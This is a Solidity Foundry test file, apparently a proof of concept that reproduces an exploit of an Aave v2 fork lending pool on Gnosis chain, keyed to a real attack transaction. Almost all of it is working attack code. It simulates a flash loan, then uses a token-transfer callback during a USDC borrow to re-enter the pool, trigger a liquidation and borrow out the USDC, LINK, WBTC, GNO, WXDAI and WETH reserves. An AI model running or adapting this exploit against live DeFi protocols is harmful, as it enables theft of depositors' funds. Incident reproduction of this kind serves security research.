// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";


interface ILendingPoolAddressesProvider {
  event MarketIdSet(string newMarketId);
  event LendingPoolUpdated(address indexed newAddress);
  event ConfigurationAdminUpdated(address indexed newAddress);
  event EmergencyAdminUpdated(address indexed newAddress);
  event LendingPoolConfiguratorUpdated(address indexed newAddress);
  event LendingPoolCollateralManagerUpdated(address indexed newAddress);
  event PriceOracleUpdated(address indexed newAddress);
  event LendingRateOracleUpdated(address indexed newAddress);
  event ProxyCreated(bytes32 id, address indexed newAddress);
  event AddressSet(bytes32 id, address indexed newAddress, bool hasProxy);

  function getMarketId() external view returns (string memory);

  function setMarketId(string calldata marketId) external;

  function setAddress(bytes32 id, address newAddress) external;

  function setAddressAsProxy(bytes32 id, address impl) external;

  function getAddress(bytes32 id) external view returns (address);

  function getLendingPool() external view returns (address);

  function setLendingPoolImpl(address pool) external;

  function getLendingPoolConfigurator() external view returns (address);

  function setLendingPoolConfiguratorImpl(address configurator) external;

  function getLendingPoolCollateralManager() external view returns (address);

  function setLendingPoolCollateralManager(address manager) external;

  function getPoolAdmin() external view returns (address);

  function setPoolAdmin(address admin) external;

  function getEmergencyAdmin() external view returns (address);

  function setEmergencyAdmin(address admin) external;

  function getPriceOracle() external view returns (address);

  function setPriceOracle(address priceOracle) external;

  function getLendingRateOracle() external view returns (address);

  function setLendingRateOracle(address lendingRateOracle) external;
}

interface ICompoundToken {
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
    function redeem(uint256 redeemAmount) external;
    function mint(uint256 amount) external;
    function comptroller() external view returns(address);
}

interface IComptroller {
    function allMarkets() external view returns(address[] memory);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
}

interface IWeth is IERC20{
    function deposit() external payable;
    function mint(address,uint256) external returns (bool);
}

contract ContractTest is Test {
    //Prepare numbers
    uint linkLendNum1 =1000000000000000100;
    uint wethlendnum2 = 1;
    uint linkDebt3 =700000000000000000;
    uint wethDebt4 = 1;
    uint linkWithdraw5 = 66666666660000000;

    //Asset addrs
    address gno = 0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb;
    address weth = 0x6A023CCd1ff6F2045C3309768eAd9E68F978f6e1;
    address link = 0xE2e73A1c69ecF83F464EFCE6A5be353a37cA09b2;
    address wbtc = 0x8e5bBbb09Ed1ebdE8674Cda39A0c169401db4252;
    address usdc = 0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83;
    address wxdai = 0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d;

    //Asset interfaces
    IERC20 private  USDC  = IERC20(usdc);
    IERC20 private  WXDAI = IERC20(wxdai);
    IWeth WETH = IWeth(weth);
    //Just using iweth here since mint is implemented
    IWeth LINK = IWeth(link);

  
    // Contract / exchange interfaces
    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    IUniswapV2Router private constant router = IUniswapV2Router(payable(0x1C232F01118CB8B424793ae03F870aa7D0ac7f77));
    ILendingPoolAddressesProvider providerAddrs;
    ILendingPool lendingPool;

    uint totalBorrowed;
    bool startBorrowing = false;

    function setUp() public {
        vm.createSelectFork("gnosis", 21120284); //fork gnosis at block number 21120319
        providerAddrs = ILendingPoolAddressesProvider(0xA91B9095eFa6C0568467562032202108e49c9Ef8);
        lendingPool = ILendingPool(providerAddrs.getLendingPool());
        //Lets just mint weth to this contract for initial debt
        vm.startPrank(0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d);
        //Mint initial weth funding
        WETH.mint(address(this),2728.934387414251504146 ether);
        WETH.mint(address(this),1);
        // Mint LINK funding
        LINK.mint(address(this),linkLendNum1);
        vm.stopPrank();

        //Lets run setup functio
        //Approve funds
        LINK.approve(address(lendingPool), type(uint256).max);
        WETH.approve(address(lendingPool), type(uint256).max);

        //Call prepare and get it setup
        prepare();
    }

    function prepare() public {
        //follow the flow of this TX https://gnosisscan.io/tx/0x45b2d71f5bbb17fa67341fdf30468f1de032db71760be0cf4df9bac316cda7cc

        uint balance = LINK.balanceOf(address(this));
        require(balance > 0,'no link');

        //Deposit weth to aave v2 fork
        lendingPool.deposit(link,linkLendNum1,address(this),0);
        lendingPool.deposit(weth,wethlendnum2,address(this),0);
        
        //Enable asset as collateral

        lendingPool.setUserUseReserveAsCollateral(link,true);
        lendingPool.setUserUseReserveAsCollateral(weth,true);
    
        //Borrow initial setup prepare debts
        lendingPool.borrow(link,linkDebt3,2,0,address(this));
        lendingPool.borrow(weth,wethDebt4,2,0,address(this));
        
        //Withdraw as per tx
        lendingPool.withdraw(link,linkWithdraw5,address(this));
    }
    function _logTokenBal(address asset) internal view returns (uint) {
        return IERC20(asset).balanceOf(address(this));
    }
    function _logBalances() internal {
        console.log('WETH Balance %d',_logTokenBal(weth));
        console.log('USDC Balance %d',_logTokenBal(usdc));
        console.log('GNO Balance %d',_logTokenBal(gno));
        console.log('LINK Balance %d',_logTokenBal(link));
        console.log('WBTC Balance %d',_logTokenBal(wbtc));

    }
    function testExploit() public {
        borrow();
        _logBalances();

    }

    function borrow() internal {
        this.uniswapV2Call(address(this),2730 ether,0,new bytes(0));
        
    }
    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data ) external {
        attackLogic(_amount0, _amount1, _data);
    }

    function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data ) internal {
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        totalBorrowed = amountToken;
        console.log("Borrowed: %s WETH from Honey", totalBorrowed);
        depositWETH();
        borrowNormal();
        _logBalances();
        uint amountRepay = ((amountToken * 1000) / 997) + 1;
        uint wethbal = WETH.balanceOf(address(this));
        if(wethbal < totalBorrowed) {
            console.log('Remaining eth is %d',totalBorrowed - wethbal);
            
                    _logBalances();

        }
        require(amountRepay < WETH.balanceOf(address(this)),'not enough eth');
        WETH.transfer(msg.sender, amountRepay);
        console.log("Repay Flashloan for : %s USDC", amountRepay/1e6);
    }

    function getMaxBorrow(address asset, uint depositedamt) public view returns (uint256) {
        IPriceOracleGetter priceOracle = IPriceOracleGetter(providerAddrs.getPriceOracle());

        // Get the LTV (Loan To Value) of the asset from the Aave Protocol
        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
        uint ltv = data.configuration.data & 0xFFFF;

        // Get the latest price of the WETH token from the Aave Oracle
        uint256 wethPrice = priceOracle.getAssetPrice(address(weth));
        console.log(ltv);

        // Adjust for token decimals
        uint256 totalCollateralValueInEth = (depositedamt * wethPrice) / (10**18); // normalize the deposited amount to ETH

        // Calculate the maximum borrowable value
        uint256 maxBorrowValueInEth = (totalCollateralValueInEth * ltv) / 10000; // LTV is scaled by a factor of 10000

        // Get the latest price of the borrowable asset from the Aave Oracle
        uint256 assetPriceInEth = priceOracle.getAssetPrice(asset);

        // Calculate the maximum borrowable amount, adjust it back to the borrowing asset's decimals
        uint256 maxBorrowAmount = (maxBorrowValueInEth * (10**18)) / assetPriceInEth;
        uint scaleDownAmt = WETH.decimals() > IERC20(asset).decimals() ? WETH.decimals()  - IERC20(asset).decimals() : 0;
        if(scaleDownAmt > 0) {
            return ((maxBorrowAmount /10**scaleDownAmt) *100)/100;
        }
        return (maxBorrowAmount * 100) / 100;
    }
   /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function depositWETH() internal {
        uint balance = WETH.balanceOf(address(this));
        require(balance > 0,'no eth');
        //Deposit weth to aave v2 fork
        lendingPool.deposit(weth,1 ether,address(this),0);
    }

    function maxBorrow(address asset,bool maxxx) internal {
        IERC20 assetX = IERC20(asset);
        uint assetXbal = assetX.balanceOf(address(this));
        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
        uint reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
        uint BorrowAmount =maxxx ? reserveTokenbal  - 1 : min(getMaxBorrow(asset,totalBorrowed),reserveTokenbal);
        if(BorrowAmount > 0) {
            console.log('Going to boorrow %d of asset %s',BorrowAmount,asset);
            lendingPool.borrow(asset,BorrowAmount,2,0,address(this));
            uint diff = assetX.balanceOf(address(this)) - assetXbal;
            require(diff == BorrowAmount,"did not borrow any funds");
            console.log('borrowed %d successfully',BorrowAmount);
        }

    }

    function borrowNormal() internal {
        //This will call onTransferToken hook on transfer of usdc,which we will use to borrow ,is this the correct flow??
        maxBorrow(usdc,false);
    }

    function borrowMaxtokens() internal {
        console.log("''we be borrowing''");
        lendingPool.deposit(weth,WETH.balanceOf(address(this)),address(this),0);
        maxBorrow(usdc,true);
        maxBorrow(link,true);
        maxBorrow(wbtc,true);
        maxBorrow(gno,true);
        maxBorrow(wxdai,true);
        maxBorrow(weth,false);
        lendingPool.withdraw(weth,totalBorrowed - WETH.balanceOf(address(this)),address(this));
                _logBalances();

    }
/*
    function swapXdai() internal {
        IWeth(payable(address(wxdai))).deposit{value: address(this).balance}();
        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);
    }
*/

    function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
        console.log('tokencall From: %s, Value: %d',_from,_value);

        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        address pair = factory.getPair(address(gno), address(weth));
        //This checks if the tokentransfercall is from the borrow of usdc
        if(_from == 0x2eCd3E49C65b30cF6353B928a1D18DF5951AAa3E &&  _value == 243667635){
            startBorrowing = true;
            console.log("''i'm in!''");

        lendingPool.liquidationCall(
            weth,
            weth,
            address(this),
            2,
            false
        );
        borrowMaxtokens();
            startBorrowing = false;
        }

    }
//   receive() external payable {}
}
